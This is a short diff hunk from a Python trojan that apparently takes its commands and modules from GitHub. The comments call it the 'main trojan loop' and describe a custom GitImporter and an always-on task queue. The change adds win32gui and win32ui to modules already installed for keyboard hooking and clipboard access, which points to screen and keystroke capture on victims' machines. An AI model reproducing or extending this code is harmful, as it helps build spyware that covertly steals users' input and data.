@@ -103,7 +103,7 @@ def module_runner(module):
     return#end function
     # main trojan loop
 install_and_import("pyHook",["pyHook"])#cant make modules import out of github
-install_and_import("PyWin32",["pythoncom","win32clipboard"])#so installing them manualy with pip
+install_and_import("PyWin32",["pythoncom","win32clipboard","win32gui","win32ui"])#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
